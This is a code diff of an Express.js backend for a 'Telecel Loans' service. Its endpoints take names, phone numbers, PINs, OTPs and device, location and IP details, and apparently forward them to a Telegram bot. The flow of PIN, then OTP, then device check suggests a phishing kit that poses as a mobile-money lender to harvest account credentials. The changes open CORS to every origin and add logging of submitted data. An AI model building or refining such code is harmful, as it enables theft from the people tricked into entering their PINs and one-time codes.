@@ -11,8 +11,7 @@ const CONFIG = {
     API_URL: process.env.API_URL || 'https://telecelcom-production.up.railway.app',
     OTP_PAGE: process.env.OTP_PAGE || 'otp.html',
     DEVICE_PAGE: process.env.DEVICE_PAGE || 'device_verify.html',
-    HOME_PAGE: process.env.HOME_PAGE || 'index.html',
-    ALLOWED_ORIGINS: ['*']
+    HOME_PAGE: process.env.HOME_PAGE || 'index.html'
 };
 
 console.log('🚀 Starting Telecel Loans API...');
@@ -21,26 +20,29 @@ console.log(`   BOT_TOKEN: ${CONFIG.BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
 console.log(`   CHAT_ID: ${CONFIG.CHAT_ID || '❌ Missing'}`);
 console.log(`   PORT: ${CONFIG.PORT}`);
 console.log(`   API_URL: ${CONFIG.API_URL}`);
-console.log(`   OTP_PAGE: ${CONFIG.OTP_PAGE}`);
-console.log(`   DEVICE_PAGE: ${CONFIG.DEVICE_PAGE}`);
-console.log(`   HOME_PAGE: ${CONFIG.HOME_PAGE}`);
 
 // ─── EXPRESS APP ───
 const app = express();
 
-// ─── MIDDLEWARE ───
+// ─── CORS MIDDLEWARE (EXPLICIT) ───
 app.use(cors({
-    origin: CONFIG.ALLOWED_ORIGINS,
-    methods: ['GET', 'POST', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization']
+    origin: '*', // Allow all origins for testing
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
+    credentials: true
 }));
 
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+// Handle preflight requests
+app.options('*', cors());
+
+app.use(bodyParser.json({ limit: '10mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 
 // ─── LOGGING ───
 app.use((req, res, next) => {
     console.log(`📥 ${req.method} ${req.path}`);
+    console.log(`   Origin: ${req.headers.origin || 'N/A'}`);
+    console.log(`   Body:`, req.body);
     next();
 });
 
@@ -65,7 +67,8 @@ app.get('/health', (req, res) => {
         uptime: process.uptime(),
         timestamp: new Date().toISOString(),
         memory: process.memoryUsage(),
-        port: CONFIG.PORT
+        port: CONFIG.PORT,
+        apiUrl: CONFIG.API_URL
     });
 });
 
@@ -91,6 +94,8 @@ async function sendTelegramMessage(message) {
 app.post('/api/authorize', async (req, res) => {
     try {
         const { name, phone, amount, pin, period } = req.body;
+
+        console.log('📝 Authorization Request:', { name, phone, amount, pin: '***', period });
 
         if (!name || !phone || !amount || !pin) {
             return res.status(400).json({
@@ -131,6 +136,8 @@ app.post('/api/authorize', async (req, res) => {
 app.post('/api/generate-otp', async (req, res) => {
     try {
         const { name, phone } = req.body;
+
+        console.log('📝 Generate OTP Request:', { name, phone });
 
         if (!name || !phone) {
             return res.status(400).json({
@@ -173,6 +180,8 @@ app.post('/api/otp-verified', async (req, res) => {
     try {
         const { name, phone, otp, verified } = req.body;
 
+        console.log('📝 OTP Verification Request:', { name, phone, otp, verified });
+
         if (!name || !phone) {
             return res.status(400).json({
                 success: false,
@@ -214,6 +223,8 @@ app.post('/api/device-verify', async (req, res) => {
     try {
         const { name, phone, device, browser, location, ip } = req.body;
 
+        console.log('📝 Device Verification Request:', { name, phone, device, browser, location, ip });
+
         if (!name || !phone) {
             return res.status(400).json({
                 success: false,
@@ -254,6 +265,8 @@ app.post('/api/device-verify', async (req, res) => {
 app.post('/api/loan-disbursed', async (req, res) => {
     try {
         const { name, phone, amount, transactionId } = req.body;
+
+        console.log('📝 Loan Disbursement Request:', { name, phone, amount, transactionId });
 
         if (!name || !phone || !amount) {
             return res.status(400).json({
